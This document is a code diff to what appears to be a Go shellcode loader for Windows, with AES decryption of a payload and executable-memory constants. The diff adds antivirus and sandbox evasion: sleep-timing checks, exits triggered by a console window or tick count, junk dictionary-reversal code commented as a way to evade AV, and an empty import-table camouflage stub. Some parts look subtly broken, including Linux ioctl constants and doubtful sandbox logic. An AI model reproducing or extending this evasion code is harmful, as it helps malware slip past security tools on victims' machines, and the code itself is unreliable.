@@ -1,5 +1,6 @@
 package main
 
+// importing the required packages
 import (
 	"crypto/aes"
 	"crypto/cipher"
@@ -9,12 +10,16 @@ import (
 	"unsafe"
 )
 
+// Constants for memory allocation and protection
 const (
 	MEM_COMMIT             = 0x1000
 	MEM_RESERVE            = 0x2000
 	PAGE_EXECUTE_READWRITE = 0x40
+	TIOCGWINSZ             = 0x5413
+	SYS_IOCTL              = 0x541B
 )
 
+// aesDecrypt decrypts the given ciphertext using the given key and IV
 func aesDecrypt(ciphertext, key, iv []byte) []byte {
 	block, err := aes.NewCipher(key)
 	if err != nil {
@@ -27,7 +32,7 @@ func aesDecrypt(ciphertext, key, iv []byte) []byte {
 	return ciphertext
 }
 
-func evadeAV() {
+func boxElder() {
 	// Sleep for 4 seconds to evade AV detection. Some AVs will skip the sleep and we can detect them by checking the time elapsed between the two time.Now() calls below.
 	// If the time elapsed is less than 3.5 seconds, we can assume that the AV skipped the sleep and we can exit the process.
 	firstTime := time.Now()
@@ -45,6 +50,85 @@ func evadeAV() {
 	if vExNuma.Find() != nil {
 		fmt.Println("VirtualAllocExNuma not found!")
 		syscall.Exit(1)
+	}
+
+	// Get the GetConsoleWindow function from the kernel32 DLL
+	getConsoleWindow := syscall.NewLazyDLL("kernel32.dll").NewProc("GetConsoleWindow")
+	// Call the GetConsoleWindow function to check if the process has a console window
+	hwnd, _, _ := getConsoleWindow.Call()
+	if hwnd != 0 {
+		// If the process has a console window, we can assume that the process is running in a sandbox and exit the process
+		syscall.Exit(1)
+	}
+
+	// Get the GetTickCount function from the kernel32 DLL
+	getTickCount := syscall.NewLazyDLL("kernel32.dll").NewProc("GetTickCount")
+	// Call the GetTickCount function to check if the process is running in a sandbox
+	tickCount, _, _ := getTickCount.Call()
+	if tickCount == 0 {
+		// If the process is running in a sandbox, we can assume that the process is being analyzed and exit the process
+		syscall.Exit(1)
+	}
+}
+
+func reverseString(s string) string {
+	runes := []rune(s)
+	for i, j := 0, len(runes)-1; i < j; i, j = i+1, j-1 {
+		runes[i], runes[j] = runes[j], runes[i]
+	}
+	return string(runes)
+}
+
+func IatCamoflauge() {
+}
+
+func evadeAV() {
+	// Call the boxElder function to perform sandbox detection
+	boxElder()
+
+	dictionary := map[string]string{
+		"apple":    "a fruit",
+		"car":      "a vehicle",
+		"house":    "a place to live",
+		"book":     "a written work",
+		"chair":    "a piece of furniture",
+		"dog":      "a pet animal",
+		"tree":     "a woody plant",
+		"water":    "a liquid substance",
+		"music":    "an art form",
+		"computer": "an electronic device",
+		"phone":    "a communication device",
+		"pizza":    "a type of food",
+		"bird":     "a feathered animal",
+		"pen":      "a writing instrument",
+		"table":    "a piece of furniture",
+		"sun":      "a star",
+		"flower":   "a plant",
+		"cloud":    "a visible mass of condensed water vapor",
+		"shoe":     "a type of footwear",
+		"door":     "an entry or exit",
+		"beach":    "a sandy area near water",
+		"mountain": "a large natural elevation",
+		"bus":      "a type of vehicle",
+		"pencil":   "a writing instrument",
+		"jacket":   "an outer garment",
+		"hat":      "a head covering",
+		"umbrella": "a portable shelter",
+		"lamp":     "a source of light",
+		"clock":    "a timepiece",
+		"cake":     "a sweet baked food",
+		"guitar":   "a musical instrument",
+		"bottle":   "a container for liquids",
+		"ball":     "a round object used in games",
+	}
+
+	// Iterate over the dictionary and reverse the letters to evade AV detection
+
+	for key, value := range dictionary {
+		reversedKey := reverseString(key)
+		reversedValue := reverseString(value)
+		dictionary[reversedKey] = reversedValue
+		delete(dictionary, key)
 	}
 
 }
